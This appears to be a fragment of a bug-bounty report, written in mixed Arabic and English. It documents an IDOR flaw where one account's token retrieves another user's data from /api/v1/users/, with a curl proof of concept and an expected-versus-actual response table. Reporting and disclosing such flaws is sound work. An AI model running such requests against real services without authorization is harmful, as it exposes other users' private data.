## Steps to Reproduce (PoC)
1. سجّل account A واحصل على token
2. سجّل account B واحصل على token
3. أرسل request باستخدام token B للوصول لـ /api/v1/users/A
4. لاحظ عودة بيانات User A

```bash
# Proof of Concept — curl command
curl -s "https://target.com/api/v1/users/123" \
   -H "Authorization: Bearer $TOKEN_B" | jq .
```

### Expected vs Actual
| | Expected | Actual |
|---|---------|--------|
| Response | 403 Forbidden | 200 OK + data |

